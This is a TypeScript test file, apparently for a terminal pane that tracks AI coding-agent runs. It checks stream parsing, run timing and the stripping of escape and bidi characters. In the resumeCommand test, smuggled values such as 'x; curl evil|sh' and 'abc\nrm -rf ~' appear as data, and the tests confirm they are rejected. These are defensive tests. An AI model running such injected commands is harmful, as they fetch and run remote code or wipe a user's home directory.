  const msg = (text: string, id?: string) => ({ type: 'assistant', ...(id ? { model_call_id: id } : {}), message: { role: 'assistant', content: [{ type: 'text', text }] } })
  const deltas = ['7', ', ', '8', '.']
  const run = fold([...deltas.map(d => msg(d)), msg('7, 8.', 'call-1')].map(e => JSON.stringify(e)))
  const msgs = run.timeline.filter(e => e.kind === 'msg')
  expect(msgs).toHaveLength(1)
  expect(msgs[0]?.label).toBe('7, 8.')
  expect(run.snippet).toBe('7, 8.')
})

test('devin model, session, tool and file strings are sanitised and capped', async () => {
  const run = applyDevinExport(
    emptyRun(1, 'devin'),
    JSON.stringify({
      session_id: `s\u001b]0;pwn\u0007${'i'.repeat(10_000)}`,
      steps: [
        {
          source: 'agent',
          model_name: `m\u001b[31m${'x'.repeat(10_000)}`,
          message: 'hi',
          tool_calls: [
            {
              function_name: `\u001b[2Jedit_${'t'.repeat(10_000)}`,
              arguments: { path: `/a/\u001b[31m${'f'.repeat(10_000)}` },
            },
          ],
        },
      ],
    }),
    0,
  )
  const dirty = /[\x00-\x1f\x7f-\x9f]/
  expect(run.model).not.toMatch(dirty)
  expect(run.model!.length).toBeLessThanOrEqual(64)
  expect(run.sessionId).not.toMatch(dirty)
  expect(run.sessionId!.length).toBeLessThanOrEqual(64)
  expect(run.timeline.some(e => e.kind === 'edit')).toBe(true)
  for (const entry of run.timeline) {
    expect(entry.label).not.toMatch(dirty)
    expect(entry.label.length).toBeLessThanOrEqual(200)
    if (entry.kind === 'edit') {
      expect(entry.label.length).toBeLessThanOrEqual(40)
      expect(entry.detail!.length).toBeLessThanOrEqual(60)
    }
  }
  expect(run.files[0]!.length).toBeLessThanOrEqual(60)
  expect(run.files[0]).not.toMatch(dirty)
})

test('1000 distinct devin models stay at five', async () => {
  const steps = Array.from({ length: 1000 }, (_, i) => ({ source: 'agent', model_name: `model-${i}` }))
  const run = applyDevinExport(emptyRun(1, 'devin'), JSON.stringify({ steps }), 0)
  expect(run.model).toBe('model-0, model-1, model-2, model-3, model-4')
  const dupes = Array.from({ length: 50 }, () => ({ source: 'agent', model_name: 'same' }))
  expect(applyDevinExport(emptyRun(1, 'devin'), JSON.stringify({ steps: dupes }), 0).model).toBe('same')
})

test('the newest run is picked across .ndjson and .out by mtime', async () => {
  const picked = pickNewestRunFile([
    { name: 'exec-run-cursor-7.ndjson', mtimeMs: 1_000, size: 10 },
    { name: 'exec-run-devin-2.out', mtimeMs: 3_000, size: 0 },
    { name: 'exec-run-agy-9.ndjson', mtimeMs: 2_000, size: 10 },
  ])
  expect(picked?.name).toBe('exec-run-devin-2.out')
  const later = pickNewestRunFile([
    { name: 'exec-run-devin-2.out', mtimeMs: 3_000, size: 0 },
    { name: 'exec-run-cursor-1.ndjson', mtimeMs: 4_000, size: 10 },
  ])
  expect(later?.backend).toBe('cursor')
  expect(later?.n).toBe(1)
})

test('switching from a devin run to a newer cursor run starts over', async () => {
  const devin = emptyRun(2, 'devin')
  expect(isSwitchedRun(null, { n: 2, backend: 'devin', size: 0 }, 0)).toBe(true)
  expect(isSwitchedRun(devin, { n: 2, backend: 'devin', size: 5 }, 5)).toBe(false)
  expect(isSwitchedRun(devin, { n: 2, backend: 'cursor', size: 90 }, 5)).toBe(true)
  expect(isSwitchedRun(devin, { n: 3, backend: 'devin', size: 90 }, 5)).toBe(true)
  expect(isSwitchedRun(devin, { n: 2, backend: 'devin', size: 3 }, 5)).toBe(true)
})

test('a killed devin task with no .exit goes stalled once process and files go quiet', async () => {
  const run = { ...emptyRun(1, 'devin'), startedAt: 0, lastGrowthAt: 0 }
  const input = (activityAt?: number) => ({ exitText: null, exportSize: null, exportText: null, activityAt })

  // Liveness unknown: the clock is refreshed as before.
  const unknown = resolveDevinRun(run, input(undefined), 200_000)
  expect(phaseOf(unknown, 200_000)).toBe('running')

  // Process alive: activity is now, so a long silent run is not stalled.
  const alive = resolveDevinRun(run, input(200_000), 200_000)
  expect(phaseOf(alive, 200_000)).toBe('running')

  // Process gone, files last touched at 1s: stalled after STALL_MS.
  const killed = resolveDevinRun(run, input(1_000), 1_000 + STALL_MS + 1)
  expect(killed.lastGrowthAt).toBe(1_000)
  expect(phaseOf(killed, 1_000 + STALL_MS + 1)).toBe('stalled')
  expect(phaseOf(killed, 1_000 + STALL_MS - 1)).toBe('running')

  // A run first seen after its files went quiet is timed from when the pane first saw it.
  const lateSeen = { ...emptyRun(2, 'devin'), startedAt: 150_000, lastGrowthAt: 150_000 }
  const quiet = resolveDevinRun(lateSeen, input(0), 200_000)
  expect(quiet.lastGrowthAt).toBe(150_000)
  expect(phaseOf(quiet, 200_000)).toBe('running')
  expect(phaseOf(quiet, 150_000 + STALL_MS + 1)).toBe('stalled')

  // An mtime in the future is clamped to now.
  expect(resolveDevinRun(run, input(999_999), 5_000).lastGrowthAt).toBe(5_000)

  // Once .exit holds a number, activity is irrelevant.
  const exited = resolveDevinRun(run, { ...input(1_000), exitText: '0', exportSize: null, exportText: null }, 500_000)
  expect(exited.exitCode).toBe(0)
})

test('a finished run that becomes newest again is not re-announced', async () => {
  const finished = { ...emptyRun(3, 'cursor'), exitCode: 0, result: { isOk: true, subtype: 'success', durationMs: null } }
  const running = { ...emptyRun(4, 'cursor'), startedAt: 0, lastGrowthAt: 0 }
  const now = 1_000_000
  // Stale finished run: anchor untouched for an hour.
  expect(shouldAnnounce(finished, now - 3_600_000, now)).toBe(false)
  // Run that just finished (anchor changed seconds ago) is still announced.
  expect(shouldAnnounce(finished, now - 5_000, now)).toBe(true)
  // A run still going is announced whatever its anchor age.
  expect(shouldAnnounce({ ...running, lastGrowthAt: now }, now - 3_600_000, now)).toBe(true)
  // A stalled run is still announced.
  expect(shouldAnnounce(running, now - 3_600_000, now)).toBe(true)
})

test('cursor partial deltas join as sent and the final message replaces them', async () => {
  const delta = (text: string) =>
    JSON.stringify({ type: 'assistant', message: { role: 'assistant', content: [{ type: 'text', text }] } })
  const lines = [
    delta('Steps'),
    delta(' '),
    delta('7'),
    delta(','),
    delta(' and'),
    delta(' 8'),
    delta('.'),
    JSON.stringify({
      type: 'assistant',
      model_call_id: 'm-1',
      message: { role: 'assistant', content: [{ type: 'text', text: 'Steps 7, and 8.' }] },
    }),
    JSON.stringify({ type: 'thinking', subtype: 'delta', text: 'hmm' }),
    delta('Next'),
  ]
  const run = fold(lines)
  const msgs = run.timeline.filter(e => e.kind === 'msg')
  expect(msgs.map(m => m.label)).toEqual(['Steps 7, and 8.', 'Next'])
  expect(run.counts.msg).toBe(2)
  expect(run.doing).toBe('writing')
  expect(run.lastMessage).toBe('Next')
})

test('a thinking event marks the run as thinking until a tool starts', async () => {
  const thinking = fold([JSON.stringify({ type: 'thinking', subtype: 'delta', text: 'x' })])
  expect(thinking.doing).toBe('thinking')
  const tool = reduceLine(
    thinking,
    JSON.stringify({ type: 'tool_call', subtype: 'started', tool_call: { readToolCall: { args: { path: '/a/b.md' } } } }),
  )
  expect(tool.doing).toBeNull()
  expect(tool.tool).toBe('read')
})

test('parseBrief pulls plan name and step scope from the delegate brief', async () => {
  const brief = [
    '# Execute via cursor — brief',
    '## Plan',
    '- **Plan path:** `docs/plans/2611051942-agent-workflow-consolidation.md`',
    '- **Step scope:** `S7, S8, S10` (Implementation steps 7, 8 and 10)',
  ].join('\n')
  expect(parseBrief(brief)).toEqual({ plan: 'agent-workflow-consolidation', scope: 'S7, S8, S10' })
  expect(parseBrief('# nothing here')).toBeNull()
})

test('a blank first chunk after a closed message does not overwrite that row', async () => {
  const msg = (text: string, final = false) =>
    JSON.stringify({
      type: 'assistant',
      ...(final ? { model_call_id: 'm' } : {}),
      message: { role: 'assistant', content: [{ type: 'text', text }] },
    })
  const run = fold([msg('First.'), msg('First.', true), msg(' '), msg('Second.')])
  expect(run.timeline.filter(e => e.kind === 'msg').map(e => e.label)).toEqual(['First.', 'Second.'])
})

test('withSpark records polls while open and freezes once the run finished', async () => {
  const open = { ...emptyRun(1), lines: 10, spark: [3] }
  expect(withSpark(open, { ...open, lines: 14 }).spark).toEqual([3, 4])
  const done = { ...open, exitCode: 0 }
  expect(withSpark(done, { ...done, lines: 10 }).spark).toEqual([3])
})

test('the spinner animates only while running, not stalled or finished', async () => {
  const run = { ...emptyRun(1), startedAt: 0, lastGrowthAt: 0 }
  expect(isAnimating(run, 1_000)).toBe(true)
  expect(isAnimating(run, 100_000)).toBe(false)
  expect(isAnimating({ ...run, exitCode: 0 }, 1_000)).toBe(false)
  expect(isAnimating(null, 1_000)).toBe(false)
})

test('event timestamp_ms sets the run start, whenever the session began reading', async () => {
  const at = (ms: number) =>
    JSON.stringify({ type: 'thinking', subtype: 'delta', text: 'x', timestamp_ms: ms })
  // The pane only started watching at 1_000_000, long after the run began.
  const start = { ...emptyRun(1), startedAt: 1_000_000, lastGrowthAt: 1_000_000 }
  const run = [at(400_000), at(460_000), at(430_000)].reduce(reduceLine, start)
  expect(run.startedAt).toBe(400_000)
  expect(run.lastEventAt).toBe(460_000)
  expect(runElapsed(run, 1_000_000)).toBe(600_000)
})

test('runElapsed stops at the exit, then the last event, for a finished run', async () => {
  const run = { ...emptyRun(1), startedAt: 100_000, lastEventAt: 160_000 }
  expect(runElapsed({ ...run, exitCode: 0, endedAt: 170_000 }, 999_000)).toBe(70_000)
  expect(runElapsed({ ...run, exitCode: 0 }, 999_000)).toBe(60_000)
  expect(runElapsed(run, 200_000)).toBe(100_000)
  expect(
    runElapsed({ ...run, result: { isOk: true, subtype: 'success', durationMs: 42_000 } }, 999_000),
  ).toBe(42_000)
  expect(runElapsed(emptyRun(1), 1)).toBeNull()
})

test('streams without timestamps keep the start they were given', async () => {
  const lines = ['a', 'b'].map(text_delta =>
    JSON.stringify({ event: 'step_update', step_type: 'agent_response', text_delta }),
  )
  const run = lines.reduce(reduceLine, { ...emptyRun(2, 'agy'), startedAt: 5_000 })
  expect(run.startedAt).toBe(5_000)
  expect(run.lastEventAt).toBeNull()
})

test('resumeCommand only interpolates a plain session id', async () => {
  const withId = (backend: Backend, sessionId: string) => ({ ...emptyRun(1, backend), sessionId })
  expect(resumeCommand(withId('cursor', 'abc-123_x.y'))).toBe('agent --resume abc-123_x.y')
  expect(resumeCommand(withId('agy', 'abc-123'))).toBe('agy --conversation abc-123')
  expect(resumeCommand(withId('cursor', 'x; curl evil|sh'))).toBeNull()
  expect(resumeCommand(withId('agy', 'abc\nrm -rf ~'))).toBeNull()
  expect(resumeCommand(withId('cursor', 'a'.repeat(65)))).toBeNull()
  expect(isCopyableId('abc-123')).toBe(true)
  expect(isCopyableId('a b')).toBe(false)
})

test('lastMessage and the brief task carry no control characters', async () => {
  const esc = '\u001b]52;c;ZXZpbA==\u0007 hello \u009b31m world'
  const streamed = appendMessage(emptyRun(1), esc)
  expect(streamed.lastMessage).not.toMatch(/[\x00-\x1f\x7f-\x9f]/)
  expect(streamed.lastMessage).toContain('hello')
  const finished = finishMessage(emptyRun(1), esc)
  expect(finished.lastMessage).not.toMatch(/[\x00-\x1f\x7f-\x9f]/)
  const brief = parseBrief('- **Plan path:** `docs/plans/a\u001b]52;x\u0007b.md`\n- **Step scope:** `S1\u001b[2J`')
  expect(brief?.plan).not.toMatch(/[\x00-\x1f\x7f-\x9f]/)
  expect(brief?.scope).toBe('S1[2J')
})

test('a Devin run with no stream is labelled truthfully, not as starting', async () => {
  expect(doingLabel(emptyRun(1, 'devin'))).toBe('running (no live stream)')
  expect(doingLabel(emptyRun(1, 'cursor'))).toBe('starting')
  expect(statusLine({ ...emptyRun(1, 'devin'), startedAt: 0 }, 1000)).toContain('running (no live stream)')
})

test('cursor and agy stream fields drawn in the pane carry no control characters', async () => {
  const bad = /[\x00-\x1f\x7f-\x9f]/
  const esc = '\u001b]52;c;ZXZpbA==\u0007'
  const cursor = fold([
    JSON.stringify({ type: 'system', subtype: 'init', session_id: `s${esc}1`, model: `gpt${esc}` }),
    JSON.stringify({
      type: 'tool_call',
      subtype: 'started',
      tool_call: { [`edit${esc}ToolCall`]: { args: { path: `/repo/a${esc}.ts` } } },
    }),
    JSON.stringify({
      type: 'tool_call',
      subtype: 'completed',
      tool_call: { editToolCall: { args: { path: `/repo/b${esc}.ts` }, result: {} } },
    }),
  ])
  for (const text of [cursor.sessionId, cursor.model, cursor.tool, cursor.toolDetail, ...cursor.files]) {
    expect(text ?? '').not.toMatch(bad)
  }
  expect(cursor.files).toEqual(['b]52;c;ZXZpbA==.ts'])

  const agy = fold(
    [
      JSON.stringify({ event: 'init', conversation_id: `c${esc}`, model: `gem${esc}` }),
      JSON.stringify({
        event: 'step_update',
        step_type: 'tool',
        tool_info: { name: `write${esc}_file`, parameters: { TargetFile: `/repo/c${esc}.ts` } },
      }),
    ],
    'agy',
  )
  for (const text of [agy.sessionId, agy.model, ...agy.files, ...agy.timeline.map(e => `${e.label} ${e.detail ?? ''}`)]) {
    expect(text ?? '').not.toMatch(bad)
  }
})

test('event stamps far from the pane clock are ignored', async () => {
  const day = 24 * 60 * 60 * 1000
  const clock = 1_000 * day
  const at = (ms: number) => JSON.stringify({ type: 'thinking', subtype: 'delta', text: 'x', timestamp_ms: ms })
  const start = { ...emptyRun(1), startedAt: clock, lastGrowthAt: clock }
  const run = [at(1), at(clock + 2 * day), at(clock - 8 * day), at(Number.MAX_VALUE), at(clock - 60_000)].reduce(
    reduceLine,
    start,
  )
  expect(run.startedAt).toBe(clock - 60_000)
  expect(run.lastEventAt).toBe(clock - 60_000)
})

test('the says row follows a streamed message past the raw buffer, the row label keeps its head', async () => {
  let run = appendMessage(emptyRun(1, 'agy'), 'HEAD ')
  for (let i = 0; i < 300; i++) run = appendMessage(run, `word${i} `)
  run = appendMessage(run, 'the very end')
  expect(run.lastMessage?.endsWith('the very end')).toBe(true)
  expect(run.msgRaw?.length).toBeLessThanOrEqual(MSG_RAW_MAX)
  const row = run.timeline[run.timeline.length - 1]!
  expect(row.label.startsWith('HEAD word0')).toBe(true)
  expect(run.timeline.filter(e => e.kind === 'msg')).toHaveLength(1)
})

const CONTROL = /[\x00-\x1f\x7f-\x9f]/

test('control characters in a result subtype never reach the label or status line', async () => {
  const dirty = '\u001b]52;c;x\u0007bad\u001b[31m'
  const cursor = fold([JSON.stringify({ type: 'result', subtype: dirty, is_error: true })])
  const agy = fold(
    [JSON.stringify({ event: 'result', status: dirty, finished_reason: 'api_error' })],
    'agy',
  )
  for (const run of [cursor, agy]) {
    expect(run.result?.subtype).not.toMatch(CONTROL)
    expect(run.result?.subtype).toContain('bad')
    expect(run.timeline.at(-1)?.label).not.toMatch(CONTROL)
    expect(statusLine({ ...run, exitCode: 0 }, 0)).not.toMatch(CONTROL)
  }
  const reasonOnly = fold([JSON.stringify({ event: 'result', finished_reason: dirty })], 'agy')
  expect(reasonOnly.result?.subtype).not.toMatch(CONTROL)
})

test('cleanErrTail strips terminal codes and keeps two lines', async () => {
  const out = cleanErrTail('\u001b[31mfirst\u001b[0m\n\u001b]52;c;x\u0007second')
  expect(out.replace('\n', '')).not.toMatch(CONTROL)
  expect(out.split('\n')).toHaveLength(2)
})

test('a session id that reads as a flag gets no resume command', async () => {
  for (const id of ['--yolo', '-h', '.hidden']) {
    expect(isCopyableId(id)).toBe(false)
    expect(resumeCommand({ ...emptyRun(1, 'cursor'), sessionId: id })).toBeNull()
  }
  expect(isCopyableId('_a-1.b')).toBe(true)
})

test('bidi and zero-width characters are stripped from drawn text', async () => {
  const sneaky = 'gpt‮5-tixe​⁦x⁩﻿'
  expect(sanitize(sneaky, 64)).toBe('gpt5-tixex')
  expect(oneLine(`a b`, 64)).toBe('a b')
})

test('event stamps past the five-minute future bound or two days back are ignored', async () => {
  const clock = 1_000 * 24 * 60 * 60 * 1000
  const at = (ms: number) => JSON.stringify({ type: 'thinking', subtype: 'delta', text: 'x', timestamp_ms: ms })
  const start = { ...emptyRun(1), startedAt: clock, lastGrowthAt: clock }
  const run = [at(clock + 10 * 60_000), at(clock - 3 * 24 * 60 * 60 * 1000), at(clock + 60_000)].reduce(
    reduceLine,
    start,
  )
  expect(run.startedAt).toBe(clock)
  expect(run.lastEventAt).toBe(clock + 60_000)
})

test('a long agy tool name is classified on its full name and shown capped', async () => {
  const name = `mcp_some_very_long_server_name_prefix_tool_read_file`
  const run = fold(
    [JSON.stringify({ event: 'step_update', step_type: 'tool', tool_info: { name, parameters: { path: '/r/a.ts' } } })],
    'agy',
  )
  expect(run.counts.read).toBe(1)
  expect(run.tool!.length).toBeLessThanOrEqual(40)
  expect(run.timeline[run.timeline.length - 1]!.label.length).toBeLessThanOrEqual(40)
})

test('an agy tool or subagent name made only of control characters falls back', async () => {
  const blank = '\u001b\u200b\u0007'
  const subagentStep = (info: Record<string, unknown>) =>
    JSON.stringify({ event: 'step_update', step_type: 'tool', subagent_info: info })
  const run = fold(
    [
      JSON.stringify({ event: 'step_update', step_type: 'tool', tool_info: { name: blank, parameters: {} } }),
      subagentStep({ name: blank, subagents: [{ type_name: blank, role: 'reviewer' }] }),
      subagentStep({ name: blank, subagents: [{ type_name: blank, role: blank }] }),
    ],
    'agy',
  )
  const labels = run.timeline.map(e => e.label)
  expect(labels[0]).toBe('tool')
  expect(labels[1]).toBe('reviewer')
  expect(labels[2]).toBe('subagent')
  expect(labels).not.toContain('')
})

test('an agy result whose finished_reason is deeply nested does not wedge the reducer', async () => {
  const depth = 20_000
  const deep = `{"event":"result","status":"SUCCESS","finished_reason":${'['.repeat(depth)}${']'.repeat(depth)}}`
  const next = JSON.stringify({ event: 'step_update', step_type: 'tool', tool_info: { name: 'read_file', parameters: {} } })
  let run = fold([], 'agy')
  expect(() => {
    run = [deep, next].reduce(reduceLine, run)
  }).not.toThrow()
  expect(run.lines).toBe(2)
  expect(run.tools).toBe(1)
})

test('a line that makes an adapter throw is counted as bad and the next line still applies', async () => {
  const good = JSON.stringify({ event: 'step_update', step_type: 'tool', tool_info: { name: 'read_file', parameters: {} } })
  // A malformed run state makes the agy adapter throw on an otherwise valid result line.
  const broken = { ...fold([], 'agy'), timeline: null } as unknown as ReturnType<typeof fold>
  const result = JSON.stringify({ event: 'result', status: 'SUCCESS', finished_reason: 'stop' })
  let after = broken
  expect(() => {
    after = reduceLine(broken, result)
  }).not.toThrow()
  expect(after.badLines).toBe(1)
  expect(after.lines).toBe(1)
  const healthy = reduceLine(fold([], 'agy'), good)
  expect(healthy.tools).toBe(1)
  expect(healthy.badLines).toBe(0)
})

test('reported durations outside a plausible run length are dropped', async () => {
  expect(durationMsOf(42_000)).toBe(42_000)
  for (const bad of [-1, Number.NaN, Infinity, 1e308, 8 * 24 * 60 * 60 * 1000, '42']) {
    expect(durationMsOf(bad)).toBeNull()
  }
  const cursor = fold([JSON.stringify({ type: 'result', subtype: 'success', duration_ms: 1e308 })])
  expect(cursor.result?.durationMs).toBeNull()
  const agy = (seconds: unknown) =>
    fold([JSON.stringify({ event: 'result', status: 'SUCCESS', finished_reason: 'stop', duration_seconds: seconds })], 'agy')
      .result?.durationMs
  expect(agy(1e308)).toBeNull()
  expect(agy(-5)).toBeNull()
  expect(agy(undefined)).toBeNull()
  expect(agy(12.5)).toBe(12_500)
})

test('a .exit mtime in the future is held to now, and a bad one is dropped', async () => {
  expect(endTimeOf(5_000, 10_000)).toBe(5_000)
  expect(endTimeOf(99_000_000, 10_000)).toBe(10_000)
  for (const bad of [0, -1, Number.NaN, Infinity, undefined, '5000']) expect(endTimeOf(bad, 10_000)).toBeNull()
})

test('side files over their byte cap are refused rather than parsed', async () => {
  expect(cappedText('0\n', EXIT_MAX_BYTES)).toBe('0\n')
  expect(cappedText('7'.repeat(EXIT_MAX_BYTES + 1), EXIT_MAX_BYTES)).toBeNull()
  // A cap counts bytes, not characters.
  expect(cappedText('é'.repeat(40), EXIT_MAX_BYTES)).toBeNull()
  expect(cappedText('x'.repeat(BRIEF_MAX_BYTES), BRIEF_MAX_BYTES)).not.toBeNull()
})

test('.exit is parsed strictly: only a short integer counts as an exit code', async () => {
  expect(devinExitCode('0\n')).toBe(0)
  expect(devinExitCode(' 137 ')).toBe(137)
  expect(devinExitCode('-1')).toBe(-1)
  for (const bad of ['12abc', '1e23', '1.5', '1234567', '', '   ', null, 'exit 1']) {
    expect(devinExitCode(bad)).toBeNull()
  }
})

test('the brief is re-read only when its size or mtime changes', async () => {
  expect(changedFileKey(null, null)).toBeNull()
  const first = changedFileKey(null, { size: 120, mtimeMs: 1_000 })
  expect(first).toBe('120:1000')
  expect(changedFileKey(first, { size: 120, mtimeMs: 1_000 })).toBeNull()
  expect(changedFileKey(first, { size: 121, mtimeMs: 1_000 })).toBe('121:1000')
  expect(changedFileKey(first, { size: 120, mtimeMs: 2_000 })).toBe('120:2000')
})

test('a Devin run is settled once it has an exit code, a result and an end time', async () => {
  const done = {
    ...emptyRun(1, 'devin'),
    exitCode: 0,
    result: { isOk: true, subtype: 'success', durationMs: null },
    endedAt: 5_000,
  }
  expect(isDevinSettled(done)).toBe(true)
  expect(isDevinSettled({ ...done, exitCode: null })).toBe(false)
  expect(isDevinSettled({ ...done, result: null })).toBe(false)
  expect(isDevinSettled({ ...done, endedAt: null })).toBe(false)
  expect(isDevinSettled({ ...done, backend: 'cursor' })).toBe(false)
  // Settled means resolveDevinRun would change nothing on a later tick.
  const again = resolveDevinRun(done, { exitText: '0\n', exportSize: null, exportText: null }, 9_000)
  expect(again.result).toEqual(done.result)
  expect(again.exitCode).toBe(0)
  expect(again.endedAt).toBe(5_000)
})

test('isReadableSideFile accepts only regular files within the cap', () => {
  expect(isReadableSideFile({ kind: 'file', size: 10 }, 64)).toBe(true)
  expect(isReadableSideFile({ kind: 'file', size: 64 }, 64)).toBe(true)
  expect(isReadableSideFile({ kind: 'file', size: 65 }, 64)).toBe(false)
  expect(isReadableSideFile({ kind: 'dir', size: 0 }, 64)).toBe(false)
  expect(isReadableSideFile({ kind: 'other', size: 0 }, 64)).toBe(false)
  expect(isReadableSideFile(null, 64)).toBe(false)
})

test('the brief key is kept only after a read went through', async () => {
  // A failed read (timeout, gone, over the cap) keeps the old key: retried next tick.
  expect(briefKeyAfterRead(null, '120:1000', null)).toBeNull()
  expect(briefKeyAfterRead('90:500', '120:1000', null)).toBe('90:500')
  // A read that went through records the key, task or not.
  expect(briefKeyAfterRead(null, '120:1000', '# no fields here')).toBe('120:1000')
  expect(briefKeyAfterRead('90:500', '120:1000', '')).toBe('120:1000')
  // Together with changedFileKey: after a failed read the same file is still "changed".
  const stat = { size: 120, mtimeMs: 1_000 }
  const failed = briefKeyAfterRead(null, changedFileKey(null, stat)!, null)
  expect(changedFileKey(failed, stat)).toBe('120:1000')
  const read = briefKeyAfterRead(null, changedFileKey(null, stat)!, 'text')
  expect(changedFileKey(read, stat)).toBeNull()
})
